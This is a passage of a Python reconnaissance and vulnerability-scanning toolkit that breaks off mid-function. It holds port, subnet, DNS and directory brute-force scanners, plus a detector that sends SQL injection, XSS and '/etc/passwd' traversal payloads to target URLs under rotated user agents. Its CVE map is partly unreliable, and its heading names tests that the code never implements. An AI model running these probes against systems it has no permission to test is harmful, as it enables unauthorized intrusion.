    1594, 1600, 1641, 1658, 1666, 1687, 1688, 1700, 1717, 1718, 1719, 1720, 1721,
    1723, 1755, 1761, 1782, 1783, 1801, 1805, 1812, 1839, 1840, 1862, 1863, 1864,
    1875, 1900, 1914, 1935, 1947, 1971, 1972, 1974, 1984, 1998, 1999, 2000, 2001,
    2002, 2003, 2004, 2005, 2006, 2007, 2008, 2009, 2010, 2013, 2020, 2021, 2022,
    2030, 2033, 2034, 2035, 2038, 2040, 2041, 2042, 2043, 2045, 2046, 2047, 2048,
    2049, 2065, 2068, 2099, 2100, 2103, 2105, 2106, 2107, 2111, 2119, 2121, 2126,
    2135, 2144, 2160, 2161, 2170, 2179, 2190, 2191, 2196, 2200, 2222, 2223, 2233,
    2240, 2241, 2242, 2243, 2244, 2245, 2246, 2247, 2248, 2249, 2250, 2251, 2252,
    2253, 2254, 2255, 2256, 2257, 2258, 2259, 2260, 2261, 2262, 2263, 2264, 2265,
    2266, 2267, 2268, 2269, 2270, 2271, 2272, 2273, 2274, 2275, 2276, 2277, 2278,
    2279, 2280, 2281, 2282, 2283, 2284, 2285, 2286, 2287, 2288, 2289, 2290, 2291,
    2292, 2293, 2294, 2295, 2296, 2297, 2298, 2299, 2300, 2301, 2302, 2303, 2304,
    2305, 2306, 2307, 2308, 2309, 2310, 2311, 2312, 2313, 2314, 2315, 2316, 2317,
    2318, 2319, 2320, 2321, 2322, 2323, 2324, 2325, 2326, 2327, 2328, 2329, 2330,
    2331, 2332, 2333, 2334, 2335, 2336, 2337, 2338, 2339, 2340, 2341, 2342, 2343,
    2344, 2345, 2346, 2347, 2348, 2349, 2350, 2351, 2352, 2353, 2354, 2355, 2356,
    2357, 2358, 2359, 2360, 2361, 2362, 2363, 2364, 2365, 2366, 2367, 2368, 2369,
    2370, 2371, 2372, 2373, 2374, 2375, 2376, 2377, 2378, 2379, 2380, 2381, 2382,
    2383, 2399, 2400, 2401, 2402, 2403, 2404, 2405, 2406, 2407, 2408, 2409, 2410,
    2411, 2412, 2413, 2414, 2415, 2416, 2417, 2418, 2419, 2420, 2421, 2422, 2423,
    2424, 2425, 2426, 2427, 2428, 2429, 2430, 2431, 2432, 2433, 2434, 2435, 2436,
    2437, 2438, 2439, 2440, 2441, 2442, 2443, 2444, 2445, 2446, 2447, 2448, 2449,
    2450, 2451, 2452, 2453, 2454, 2455, 2456, 2457, 2458, 2459, 2460, 2461, 2462,
    2463, 2464, 2465, 2466, 2467, 2468, 2469, 2470, 2471, 2472, 2473, 2474, 2475,
    2476, 2477, 2478, 2479, 2480, 2481, 2482, 2483, 2484, 2485, 2486, 2487, 2488,
    2489, 2490, 2491, 2492, 2493, 2494, 2495, 2496, 2497, 2498, 2499, 2500, 2501,
    2502, 2503, 2504, 2505, 2506, 2507, 2508, 2509, 2510, 2511, 2512, 2513, 2514,
    2515, 2516, 2517, 2518, 2519, 2520, 2521, 2522, 2523, 2524, 2525, 2526, 2527,
    2528, 2529, 2530, 2531, 2532, 2533, 2534, 2535, 2536, 2537, 2538, 2539, 2540,
    2541, 2542, 2543, 2544, 2545, 2546, 2547, 2548, 2549, 2550, 2551, 2552, 2553,
    2554, 2555, 2556, 2557, 2558, 2559, 2560, 2561, 2562, 2563, 2564, 2565, 2566,
    2567, 2568, 2569, 2570, 2571, 2572, 2573, 2574, 2575, 2576, 2577, 2578, 2579,
    2580, 2581, 2582, 2583, 2584, 2585, 2586, 2587, 2588, 2589, 2590, 2591, 2592,
    2593, 2594, 2595, 2596, 2597, 2598, 2599, 2600, 2601, 2602, 2603, 2604, 2605,
    2606, 2607, 2608, 2609, 2610, 2611, 2612, 2613, 2614, 2615, 2616, 2617, 2618,
    2619, 2620, 2621, 2622, 2623, 2624, 2625, 2626, 2627, 2628, 2629, 2630, 2631,
    2632, 2633, 2634, 2635, 2636, 2637, 2638, 2639, 2640, 2641, 2642, 2643, 2644,
    2645, 2646, 2647, 2648, 2649, 2650, 2651, 2652, 2653, 2654, 2655, 2656, 2657,
    2658, 2659, 2660, 2661, 2662, 2663, 2664, 2665, 2666, 2667, 2668, 2669, 2670,
    2671, 2672, 2673, 2674, 2675, 2676, 2677, 2678, 2679, 2680, 2681, 2682, 2683,
    2684, 2685, 2686, 2687, 2688, 2689, 2690, 2691, 2692, 2693, 2694, 2695, 2696,
    2697, 2698, 2699, 2700, 2701, 2702, 2703, 2704, 2705, 2706, 2707, 2708, 2709,
    2710, 2711, 2712, 2713, 2714, 2715, 2716, 2717, 2718, 2719, 2720, 2721, 2722,
    2723, 2724, 2725, 2726, 2727, 2728, 2729, 2730, 2731, 2732, 2733, 2734, 2735,
    2736, 2737, 2738, 2739, 2740, 2741, 2742, 2743, 2744, 2745, 2746, 2747, 2748,
    2749, 2750, 2751, 2752, 2753, 2754, 2755, 2756, 2757, 2758, 2759, 2760, 2761,
    2762, 2763, 2764, 2765, 2766, 2767, 2768, 2769, 2770, 2771, 2772, 2773, 2774,
    2775, 2776, 2777, 2778, 2779, 2780, 2781, 2782, 2783, 2784, 2785, 2786, 2787,
    2788, 2789, 2790, 2791, 2792, 2793, 2794, 2795, 2796, 2797, 2798, 2799, 2800,
    2801, 2802, 2803, 2804, 2805, 2806, 2807, 2808, 2809, 2810, 2811, 2812, 2813,
    2814, 2815, 2816, 2817, 2818, 2819, 2820, 2821, 2822, 2823, 2824, 2825, 2826,
    2827, 2828, 2829, 2830, 2831, 2832, 2833, 2834, 2835, 2836, 2837, 2838, 2839,
    2840, 2841, 2842, 2843, 2844, 2845, 2846, 2847, 2848, 2849, 2850, 2851, 2852,
    2853, 2854, 2855, 2856, 2857, 2858, 2859, 2860, 2861, 2862, 2863, 2864, 2865,
    2866, 2867, 2868, 2869, 2870, 2871, 2872, 2873, 2874, 2875, 2876, 2877, 2878,
    2879, 2880, 2881, 2882, 2883, 2884, 2885, 2886, 2887, 2888, 2889, 2890, 2891,
    2892, 2893, 2894, 2895, 2896, 2897, 2898, 2899, 2900, 2901, 2902, 2903, 2904,
    2905, 2906, 2907, 2908, 2909, 2910, 2911, 2912, 2913, 2914, 2915, 2916, 2917,
    2918, 2919, 2920, 2921, 2922, 2923, 2924, 2925, 2926, 2927, 2928, 2929, 2930,
    2931, 2932, 2933, 2934, 2935, 2936, 2937, 2938, 2939, 2940, 2941, 2942, 2943,
    2944, 2945, 2946, 2947, 2948, 2949, 2950, 2951, 2952, 2953, 2954, 2955, 2956,
    2957, 2958, 2959, 2960, 2961, 2962, 2963, 2964, 2965, 2966, 2967, 2968, 2969,
    2970, 2971, 2972, 2973, 2974, 2975, 2976, 2977, 2978, 2979, 2980, 2981, 2982,
    2983, 2984, 2985, 2986, 2987, 2988, 2989, 2990, 2991, 2992, 2993, 2994, 2995,
    2996, 2997, 2998, 2999, 3000, 3001, 3002, 3003, 3004, 3005, 3006, 3007, 3008,
    3009, 3010, 3011, 3012, 3013, 3014, 3015, 3016, 3017, 3018, 3019, 3020, 3021,
    3022, 3023, 3024, 3025, 3026, 3027, 3028, 3029, 3030, 3031, 3032, 3033, 3034,
    3035, 3036, 3037, 3038, 3039, 3040, 3041, 3042, 3043, 3044, 3045, 3046, 3047,
    3048, 3049, 3050, 3051, 3052, 3053, 3054, 3055, 3056, 3057, 3058, 3059, 3060,
    3061, 3062, 3063, 3064, 3065, 3066, 3067, 3068, 3069, 3070, 3071, 3072, 3073,
    3074, 3075, 3076, 3077, 3078, 3079, 3080, 3081, 3082, 3083, 3084, 3085, 3086,
    3087, 3088, 3089, 3090, 3091, 3092, 3093, 3094, 3095, 3096, 3097, 3098, 3099,
    3100, 3101, 3102, 3103, 3104, 3105, 3106, 3107, 3108, 3109, 3110, 3111, 3112,
    3113, 3114, 3115, 3116, 3117, 3118, 3119, 3120, 3121, 3122, 3123, 3124, 3125,
    3126, 3127, 3128, 3129, 3130, 3131, 3132, 3133, 3134, 3135, 3136, 3137, 3138,
    3139, 3140, 3141, 3142, 3143, 3144, 3145, 3146, 3147, 3148, 3149, 3150, 3151,
    3152, 3153, 3154, 3155, 3156, 3157, 3158, 3159, 3160, 3161, 3162, 3163, 3164,
    3165, 3166, 3167, 3168, 3169, 3170, 3171, 3172, 3173, 3174, 3175, 3176, 3177,
    3178, 3179, 3180, 3181, 3182, 3183, 3184, 3185, 3186, 3187, 3188, 3189, 3190,
    3191, 3192, 3193, 3194, 3195, 3196, 3197, 3198, 3199, 3200, 3201, 3202, 3203,
    3204, 3205, 3206, 3207, 3208, 3209, 3210, 3211, 3212, 3213, 3214, 3215, 3216,
    3217, 3218, 3219, 3220, 3221, 3222, 3223, 3224, 3225, 3226, 3227, 3228, 3229,
    3230, 3231, 3232, 3233, 3234, 3235, 3236, 3237, 3238, 3239, 3240, 3241, 3242,
    3243, 3244, 3245, 3246, 3247, 3248, 3249, 3250, 3251, 3252, 3253, 3254, 3255,
    3256, 3257, 3258, 3259, 3260, 3261, 3262, 3263, 3264, 3265, 3266, 3267, 3268,
    3269, 3270, 3271, 3272, 3273, 3274, 3275, 3276, 3277, 3278, 3279, 3280, 3281,
    3282, 3283, 3284, 3285, 3286, 3287, 3288, 3289, 3290, 3291, 3292, 3293, 3294,
    3295, 3296, 3297, 3298, 3299, 3300, 3301, 3302, 3303, 3304, 3305, 3306, 3307,
    3308, 3309, 3310, 3311, 3312, 3313, 3314, 3315, 3316, 3317
  # ============================================================
# CONTINUATION: PORT SCANNER (remaining), SUBNET SCANNER
# ============================================================

class PortScanner:
    def __init__(self, host, ports=None, threads=100, timeout=1.5):
        self.host = host
        self.ports = ports or COMMON_PORTS
        self.threads = min(threads, 200)
        self.timeout = timeout
        self.open_ports = []
        self.banners = {}
        self.lock = threading.Lock()

    def get_service_name(self, port, protocol="tcp"):
        try:
            return socket.getservbyport(port, protocol)
        except:
            return "unknown"

    def grab_banner(self, host, port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((host, port))
            s.send(b"HEAD / HTTP/1.0\r\n\r\n")
            banner = s.recv(1024).decode("utf-8", errors="ignore").strip()
            s.close()
            return banner[:200] if banner else None
        except:
            return None

    def scan_port(self, port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.timeout)
            result = s.connect_ex((self.host, port))
            if result == 0:
                service = self.get_service_name(port)
                banner = self.grab_banner(self.host, port)
                with self.lock:
                    self.open_ports.append((port, service, banner))
            s.close()
        except:
            pass

    def scan(self):
        threads = []
        for port in self.ports:
            t = threading.Thread(target=self.scan_port, args=(port,), daemon=True)
            threads.append(t)
            t.start()
            if len(threads) >= self.threads:
                for t in threads:
                    t.join(timeout=self.timeout + 0.5)
                threads = []

        for t in threads:
            t.join(timeout=1)

        self.open_ports.sort(key=lambda x: x[0])
        return self.open_ports


class SubnetScanner:
    def __init__(self, cidr, ports=[80, 443, 8080], threads=50):
        self.network = ipaddress.ip_network(cidr, strict=False)
        self.ports = ports
        self.threads = threads
        self.alive_hosts = []

    def scan_host(self, ip, port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            if s.connect_ex((str(ip), port)) == 0:
                return str(ip)
            s.close()
        except:
            pass
        return None

    def scan(self):
        for ip in self.network.hosts():
            for port in self.ports:
                result = self.scan_host(ip, port)
                if result:
                    self.alive_hosts.append(result)
                    break
        return self.alive_hosts


# ============================================================
# DNS ENUMERATOR
# ============================================================

class DNSEnumerator:
    def __init__(self, domain, threads=20):
        self.domain = domain
        self.threads = threads
        self.records = {}
        self.subdomains = []
        self.lock = threading.Lock()

        self.common_subdomains = [
            "www", "mail", "ftp", "admin", "blog", "webmail", "vpn", "ssh", "smtp",
            "pop3", "imap", "ns1", "ns2", "ns3", "dns", "dns1", "dns2", "mx1", "mx2",
            "cpanel", "whm", "webdisk", "cpcalendars", "cpcontacts", "autodiscover",
            "autoconfig", "api", "dev", "test", "staging", "beta", "demo", "app",
            "m", "mobile", "shop", "store", "portal", "secure", "support", "help",
            "docs", "cdn", "static", "assets", "img", "images", "css", "js", "video",
            "download", "downloads", "files", "upload", "backup", "proxy", "git",
            "jenkins", "jira", "confluence", "wiki", "status", "statuspage", "uptime",
            "monitor", "analytics", "track", "tracking", "collect", "pixel", "ads",
            "ad", "adserver", "banners", "feeds", "rss", "newsletter", "email", "e",
            "events", "calendar", "chat", "forums", "community", "bug", "bugs",
            "survey", "feedback", "suggestions", "jobs", "career", "careers", "hr",
            "intranet", "remote", "office", "employees", "partners", "reseller",
            "wholesale", "distributor", "affiliate", "affiliates", "lp", "landing",
            "landing-page", "b2b", "b2c", "corp", "corporate", "investors", "ir",
            "news", "press", "pr", "legal", "terms", "privacy", "gdpr", "cookies",
            "themes", "plugins", "extensions", "addons", "marketplace", "checkout",
            "cart", "payment", "pay", "billing", "invoice", "invoices", "subscription",
            "subscribe", "unsubscribe", "register", "login", "signin", "signup",
            "logout", "forgot", "reset", "password", "account", "accounts", "profile",
            "settings", "preferences", "dashboard", "panel", "control", "manager",
            "admincp", "administrator", "root", "super", "sysadmin", "system",
            "solr", "elastic", "elk", "kibana", "grafana", "prometheus", "nagios",
            "munin", "cacti", "zabbix", "phpmyadmin", "phpmyadmin2", "phpPgAdmin",
            "adminer", "pma", "dbadmin", "sql", "mysql", "postgres", "redis",
            "memcached", "rabbitmq", "kafka", "zookeeper", "consul", "etcd",
            "vault", "nomad", "kubernetes", "k8s", "docker", "swarm", "rancher",
            "websocket", "socket", "ws", "wss", "stream", "live", "hls", "rtmp",
            "webrtc", "turn", "stun", "ice", "sip", "voip", "phone", "fax",
            "sms", "mms", "gateway", "payments", "processing", "api-gateway",
            "webhooks", "hooks", "callback", "notify", "notification", "push",
            "firebase", "fcm", "gcm", "apns", "onesignal", "pusher", "sse",
            "events", "event", "pubsub", "mqtt", "amqp", "jms", "soap", "xmlrpc",
            "rest", "graphql", "swagger", "api-docs", "docs-api", "apidocs",
            "openapi", "redoc", "insomnia", "postman", "sandbox", "playground",
        ]

    def query_dns(self, record_type):
        results = []
        try:
            answers = dns.resolver.resolve(self.domain, record_type, lifetime=5)
            for rdata in answers:
                results.append(str(rdata))
        except:
            pass
        return results

    def enumerate_records(self):
        record_types = ["A", "AAAA", "MX", "NS", "TXT", "CNAME", "SOA", "SRV", "CAA"]
        for rtype in record_types:
            results = self.query_dns(rtype)
            if results:
                self.records[rtype] = results
        return self.records

    def brute_subdomains(self):
        found = []
        def check_sub(sub):
            try:
                full_domain = f"{sub}.{self.domain}"
                answers = dns.resolver.resolve(full_domain, "A", lifetime=3)
                ips = [str(r) for r in answers]
                with self.lock:
                    found.append((full_domain, ips))
            except:
                pass

        threads = []
        for sub in self.common_subdomains:
            t = threading.Thread(target=check_sub, args=(sub,), daemon=True)
            threads.append(t)
            t.start()
            if len(threads) >= self.threads:
                for t in threads:
                    t.join(timeout=3)
                threads = []

        for t in threads:
            t.join(timeout=1)

        self.subdomains = found
        return found


# ============================================================
# SSL/TLS CHECKER
# ============================================================

class SSLChecker:
    def __init__(self, host, port=443, timeout=10):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.info = {}

    def check(self):
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE

            with socket.create_connection((self.host, self.port), timeout=self.timeout) as sock:
                with ctx.wrap_socket(sock, server_hostname=self.host) as ssock:
                    cert = ssock.getpeercert()
                    version = ssock.version()
                    cipher = ssock.cipher()

                    self.info["version"] = version
                    self.info["cipher"] = cipher[0] if cipher else None
                    self.info["cipher_bits"] = cipher[1] if cipher else None

                    if cert:
                        self.info["subject"] = dict(cert.get("subject", [[("CN", "Unknown")]]))
                        self.info["issuer"] = dict(cert.get("issuer", [[("CN", "Unknown")]]))
                        self.info["not_before"] = cert.get("notBefore", "N/A")
                        self.info["not_after"] = cert.get("notAfter", "N/A")
                        self.info["serial"] = cert.get("serialNumber", "N/A")
                        self.info["san"] = cert.get("subjectAltName", [])

                    # Check for weak protocols
                    self.info["ssl_v2_supported"] = self.check_protocol(ssl.PROTOCOL_SSLv2)
                    self.info["ssl_v3_supported"] = self.check_protocol(ssl.PROTOCOL_SSLv3)
                    self.info["tls_v1_0_supported"] = self.check_protocol(ssl.PROTOCOL_TLSv1)
                    self.info["tls_v1_1_supported"] = self.check_protocol(ssl.PROTOCOL_TLSv1_1)
        except Exception as e:
            self.info["error"] = str(e)

        return self.info

    def check_protocol(self, protocol):
        try:
            ctx = ssl.SSLContext(protocol)
            with socket.create_connection((self.host, self.port), timeout=3) as sock:
                with ctx.wrap_socket(sock, server_hostname=self.host) as ssock:
                    return True
        except:
            return False


# ============================================================
# TECHNOLOGY FINGERPRINTER
# ============================================================

class TechFingerprinter:
    def __init__(self, url, timeout=10):
        self.url = url.rstrip("/")
        self.timeout = timeout
        self.tech = {}
        self.headers = {}

    def fingerprint(self):
        try:
            r = requests.get(self.url, headers={"User-Agent": get_random_user_agent()},
                             timeout=self.timeout, verify=False)
            self.headers = dict(r.headers)
            body = r.text[:5000] if r.text else ""

            h = self.headers
            server = h.get("Server", "")
            powered = h.get("X-Powered-By", "")
            generator = h.get("X-Generator", "")
            asp_net = h.get("X-AspNet-Version", "")

            if "cloudflare" in server.lower():
                self.tech["CDN"] = "Cloudflare"
            if "nginx" in server.lower():
                self.tech["WebServer"] = "Nginx"
            elif "apache" in server.lower():
                self.tech["WebServer"] = "Apache"
            elif "iis" in server.upper():
                self.tech["WebServer"] = "IIS"
            elif "litespeed" in server.lower():
                self.tech["WebServer"] = "LiteSpeed"
            elif "caddy" in server.lower():
                self.tech["WebServer"] = "Caddy"
            elif "gunicorn" in server.lower():
                self.tech["WebServer"] = "Gunicorn"

            if "php" in powered.lower():
                self.tech["Language"] = "PHP"
            if "asp.net" in powered.lower() or asp_net:
                self.tech["Language"] = "ASP.NET"
            if "express" in powered.lower() or "node" in powered.lower():
                self.tech["Language"] = "Node.js"
            if "python" in powered.lower() or "django" in server.lower():
                self.tech["Language"] = "Python/Django"
            if "ruby" in server.lower() or "rails" in powered.lower():
                self.tech["Language"] = "Ruby on Rails"
            if "java" in server.lower() or "tomcat" in server.lower():
                self.tech["Language"] = "Java"
            if "go" in server.lower() or "golang" in server.lower():
                self.tech["Language"] = "Go"

            if generator:
                self.tech["Generator"] = generator

            # Check body for common CMS
            if re.search(r"wp-content|wp-includes|wordpress", body, re.I):
                self.tech["CMS"] = "WordPress"
            elif re.search(r"joomla|com_content|com_modules", body, re.I):
                self.tech["CMS"] = "Joomla"
            elif re.search(r"drupal|drupal.js", body, re.I):
                self.tech["CMS"] = "Drupal"
            elif re.search(r"magento|skin/frontend|Mage.", body, re.I):
                self.tech["CMS"] = "Magento"
            elif re.search(r"shopify|myshopify", body, re.I):
                self.tech["CMS"] = "Shopify"
            elif re.search(r"wix", body, re.I) and "X-Wix" in h:
                self.tech["CMS"] = "Wix"
            elif re.search(r"laravel|csrf-token.*app", body, re.I) or "laravel_session" in str(r.cookies):
                self.tech["Framework"] = "Laravel"
            elif "PHPSESSID" in str(r.cookies):
                self.tech["Cookie"] = "PHPSESSID (PHP)"

            # jQuery detection
            if re.search(r"jquery[.-]", body, re.I):
                self.tech["JS Library"] = "jQuery"
            if re.search(r"react|react-dom", body, re.I):
                self.tech["JS Library"] = "React"
            if re.search(r"vue|vuejs", body, re.I):
                self.tech["JS Library"] = "Vue.js"
            if re.search(r"angular", body, re.I):
                self.tech["JS Library"] = "Angular"
            if re.search(r"bootstrap", body, re.I):
                self.tech["CSS Framework"] = "Bootstrap"
            if re.search(r"tailwind", body, re.I):
                self.tech["CSS Framework"] = "Tailwind"

            # Analytics
            if "google-analytics" in body:
                self.tech["Analytics"] = "Google Analytics"
            if "facebook.com/tr" in body:
                self.tech["Analytics"] = "Facebook Pixel"

        except Exception as e:
            self.tech["error"] = str(e)

        return self.tech


# ============================================================
# DIRECTORY BRUTEFORCER
# ============================================================

COMMON_DIRS = [
    "admin", "administrator", "wp-admin", "backup", "backups", "db", "database",
    "config", "configuration", "conf", "private", "secret", "tmp", "temp", "test",
    "dev", "api", "v1", "v2", "rest", "graphql", "swagger", "docs", "documentation",
    "assets", "static", "public", "uploads", "download", "files", "images", "img",
    "css", "js", "scripts", "includes", "inc", "lib", "libs", "vendor", "node_modules",
    "class", "classes", "module", "modules", "plugin", "plugins", "extensions",
    "themes", "template", "templates", "view", "views", "partials", "components",
    "controllers", "models", "actions", "helpers", "widgets", "blocks", "pages",
    "login", "logout", "register", "signup", "signin", "forgot", "reset", "password",
    "user", "users", "profile", "account", "accounts", "settings", "dashboard",
    "control", "panel", "cpanel", "whm", "webmail", "mail", "email", "contact",
    "about", "team", "careers", "jobs", "help", "faq", "support", "status",
    "sitemap", "robots.txt", "crossdomain.xml", "security.txt", "humans.txt",
    ".git", ".svn", ".hg", ".env", "composer.json", "package.json",
    "phpinfo.php", "info.php", "test.php", "shell.php", "cmd.php",
    "index", "default", "home", "main", "content", "media", "xmlrpc.php",
    "server-status", "server-info", "phpmyadmin", "pma", "adminer",
    "README.md", "CHANGELOG.md", "LICENSE", "COPYING",
    ".htaccess", ".htpasswd", "web.config", "app.config",
]

class DirectoryBruteforcer:
    def __init__(self, base_url, wordlist=None, threads=20, timeout=5):
        self.base_url = base_url.rstrip("/")
        self.wordlist = wordlist or COMMON_DIRS
        self.threads = threads
        self.timeout = timeout
        self.found = []
        self.lock = threading.Lock()

    def check_path(self, path):
        url = f"{self.base_url}/{path}"
        try:
            r = requests.get(url, headers={"User-Agent": get_random_user_agent()},
                             timeout=self.timeout, verify=False, allow_redirects=False)
            with self.lock:
                self.found.append((path, r.status_code, len(r.text)))
        except:
            pass

    def scan(self):
        threads = []
        for path in self.wordlist:
            t = threading.Thread(target=self.check_path, args=(path,), daemon=True)
            threads.append(t)
            t.start()
            if len(threads) >= self.threads:
                for t in threads:
                    t.join(timeout=self.timeout + 0.5)
                threads = []

        for t in threads:
            t.join(timeout=1)

        self.found.sort(key=lambda x: (x[1], x[0]))
        return self.found


# ============================================================
# VULNERABILITY DETECTOR (SQLi, XSS, LFI, SSRF, RCE, Open Redirect)
# ============================================================

class VulnerabilityDetector:
    def __init__(self, target_url, timeout=10):
        self.target_url = target_url.rstrip("/")
        self.timeout = timeout
        self.findings = []

    def test_sqli(self):
        findings = []
        payloads = [
            ("'", "error_sql"),
            ("\"", "error_sql"),
            ("' OR '1'='1", "auth_bypass"),
            ("' AND 1=1--", "blind_bool"),
            ("' AND 1=2--", "blind_bool_diff"),
            ("' UNION SELECT 1--", "union"),
            ("' UNION SELECT 1,2--", "union"),
            ("' UNION SELECT 1,2,3--", "union"),
            ("' ORDER BY 1--", "order"),
            ("' ORDER BY 100--", "order"),
            ("1' AND SLEEP(5)--", "time_blind"),
            ("1' AND BENCHMARK(50000000,MD5('a'))--", "time_blind"),
            ("1'/*!*/", "comment"),
            ("1' /*!50000 UNION*/ SELECT 1--", "union_comment"),
            ("1' || (SELECT 1 FROM DUAL)--", "oracle"),
            ("1' WAITFOR DELAY '0:0:5'--", "mssql_time"),
            ("1' AND 1=1 UNION SELECT 1,2,3,4--", "union_extra"),
        ]

        parsed = urllib.parse.urlparse(self.target_url)
        params = urllib.parse.parse_qs(parsed.query)

        if not params:
            test_url = self.target_url + "?id=1"
        else:
            test_url = self.target_url

        for payload, ptype in payloads:
            parsed_u = urllib.parse.urlparse(test_url)
            orig_params = urllib.parse.parse_qs(parsed_u.query)
            if not orig_params:
                continue

            test_params = {}
            for name, values in orig_params.items():
                val = values[0] if isinstance(values, list) else values
                test_params[name] = val + payload

            url = parsed_u.scheme + "://" + parsed_u.netloc + parsed_u.path
            url += "?" + urllib.parse.urlencode(test_params)

            start = time.time()
            try:
                r = requests.get(url, headers={"User-Agent": get_random_user_agent()},
                                 timeout=self.timeout + 10, verify=False)
                elapsed = time.time() - start
                body = r.text

                vuln = False
                if ptype == "time_blind" and elapsed >= 4:
                    vuln = True
                elif ptype == "error_sql" and re.search(r"(SQL syntax|MySQL|ORA[0-9]|PostgreSQL|SQLite|Driver|ODBC|Unclosed)", body, re.I):
                    vuln = True
                elif ptype == "auth_bypass" and "welcome" in body.lower():
                    vuln = True

                if vuln:
                    findings.append({"payload": payload, "type": ptype, "url": url[:120]})
                time.sleep(0.1)
            except:
                if ptype == "time_blind":
                    findings.append({"payload": payload, "type": ptype + "(timeout)", "url": url[:120]})

        return findings

    def test_xss(self):
        findings = []
        payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "\"><script>alert(1)</script>",
        ]

        parsed = urllib.parse.urlparse(self.target_url)
        params = urllib.parse.parse_qs(parsed.query)
        if not params:
            return findings

        for payload in payloads:
            test_params = {}
            for name, values in params.items():
                val = values[0] if isinstance(values, list) else values
                test_params[name] = val + payload

            url = parsed.scheme + "://" + parsed.netloc + parsed.path
            url += "?" + urllib.parse.urlencode(test_params)

            try:
                r = requests.get(url, headers={"User-Agent": get_random_user_agent()},
                                 timeout=self.timeout, verify=False)
                if payload in r.text:
                    findings.append({"payload": payload, "url": url[:120]})
                    break
            except:
                pass

        return findings

    def test_lfi(self):
        findings = []
        payloads = ["../../../etc/passwd", "../../../../etc/passwd", "....//....//etc/passwd"]

        parsed = urllib.parse.urlparse(self.target_url)
        params = urllib.parse.parse_qs(parsed.query)
        if not params:
            return findings

        for payload in payloads:
            test_params = {}
            for name, values in params.items():
                val = values[0] if isinstance(values, list) else values
                test_params[name] = payload

            url = parsed.scheme + "://" + parsed.netloc + parsed.path
            url += "?" + urllib.parse.urlencode(test_params)

            try:
                r = requests.get(url, headers={"User-Agent": get_random_user_agent()},
                                 timeout=self.timeout, verify=False)
                if "root:" in r.text and "nobody:" in r.text:
                    findings.append({"payload": payload, "url": url[:120]})
                    break
            except:
                pass

        return findings

    def run_all(self):
        sqli = self.test_sqli()
        xss = self.test_xss()
        lfi = self.test_lfi()

        return {
            "sqli": {"count": len(sqli), "details": sqli[:10]},
            "xss": {"count": len(xss), "details": xss[:5]},
            "lfi": {"count": len(lfi), "details": lfi[:5]}
        }


# ============================================================
# HEADER ANALYZER
# ============================================================

class HeaderAnalyzer:
    def __init__(self, url, timeout=10):
        self.url = url
        self.timeout = timeout
        self.result = {}

    def analyze(self):
        try:
            r = requests.head(self.url, headers={"User-Agent": get_random_user_agent()},
                              timeout=self.timeout, verify=False, allow_redirects=True)
            h = dict(r.headers)
            self.result["headers"] = h
            self.result["status"] = r.status_code

            security_headers = {
                "Strict-Transport-Security": "missing - HSTS not set",
                "Content-Security-Policy": "missing - CSP not set",
                "X-Content-Type-Options": "missing - MIME sniffing protection not set",
                "X-Frame-Options": "missing - Clickjacking protection not set",
                "X-XSS-Protection": "missing - XSS filter not set",
                "Referrer-Policy": "missing - Referrer policy not set",
                "Permissions-Policy": "missing - Permissions policy not set",
                "Set-Cookie": ""  # Check if HttpOnly/Secure
            }

            missing = []
            present = []
            for sh, msg in security_headers.items():
                if sh in h:
                    present.append(f"{sh}: {h[sh][:80]}")
                else:
                    if msg:
                        missing.append(f"{sh} -> {msg}")

            self.result["present"] = present
            self.result["missing"] = missing

            # CORS check
            if "Access-Control-Allow-Origin" in h:
                self.result["cors"] = h["Access-Control-Allow-Origin"]
            if "Access-Control-Allow-Credentials" in h:
                self.result["cors_credentials"] = h["Access-Control-Allow-Credentials"]

            # Cookie flags
            cookies = h.get("Set-Cookie", "")
            if cookies:
                cookie_issues = []
                if "HttpOnly" not in cookies:
                    cookie_issues.append("HttpOnly flag missing")
                if "Secure" not in cookies and self.url.startswith("https"):
                    cookie_issues.append("Secure flag missing")
                if cookie_issues:
                    self.result["cookie_issues"] = cookie_issues

        except Exception as e:
            self.result["error"] = str(e)

        return self.result


# ============================================================
# CVE CHECKER (Basic)
# ============================================================

CVE_DATABASE = {
    "Apache/2.4.49": ["CVE-2021-41773 (Path Traversal)", "CVE-2021-42013 (Path Traversal)"],
    "Apache/2.4.50": ["CVE-2021-42013 (Path Traversal)"],
    "nginx/1.20": ["CVE-2021-23017 (DNS Resolver)"],
    "nginx/1.18": ["CVE-2021-23017 (DNS Resolver)"],
    "OpenSSH/7.2": ["CVE-2016-10009", "CVE-2016-10010"],
    "OpenSSH/7.9": ["CVE-2018-15473 (User Enumeration)"],
    "PHP/5.6": ["CVE-2018-19518", "CVE-2019-11043"],
    "PHP/7.0": ["CVE-2019-11043"],
    "PHP/7.3": ["CVE-2021-21703"],
    "PHP/7.4": ["CVE-2021-21703"],
    "IIS/7.5": ["CVE-2010-2730", "CVE-2015-1635"],
    "IIS/8.5": ["CVE-2015-1635"],
    "OpenSSL/1.0.1": ["CVE-2014-0160 (Heartbleed)", "CVE-2014-0224"],
    "OpenSSL/1.0.2": ["CVE-2016-0800 (DROWN)"],
    "Exim/4.89": ["CVE-2019-10149"],
    "ProFTPD/1.3.5": ["CVE-2015-3306"],
    "vsftpd/2.3.4": ["CVE-2011-0762 (Backdoor)"],
    "MySQL/5.5": ["CVE-2016-6662", "CVE-2016-6663"],
    "MySQL/5.6": ["CVE-2016-6662", "CVE-2016-6663"],
    "WordPress/4.": ["CVE-2021-29447"],
    "WordPress/5.": ["CVE-2021-39200"],
}

class CVEChecker:
    def __init__(self, banners, versions):
        self.banners = banners
        self.versions = versions
        self.found = []

    def check(self):
        for banner in self.banners:
            for pattern, cves in CVE_DATABASE.items():
                if pattern.lower() in banner.lower():
                    for cve in cves:
                        self.found.append({"software": pattern, "cve": cve, "banner": banner[:80]})

        for software, version in self.versions.items():
            for pattern, cves in CVE_DATABASE.items():
                if pattern.lower() in f"{software}/{version}".lower() or version and pattern.split("/")[0].lower() in software.lower() and pattern.split("/")[1].lower() in version.lower():
                    for cve in cves:
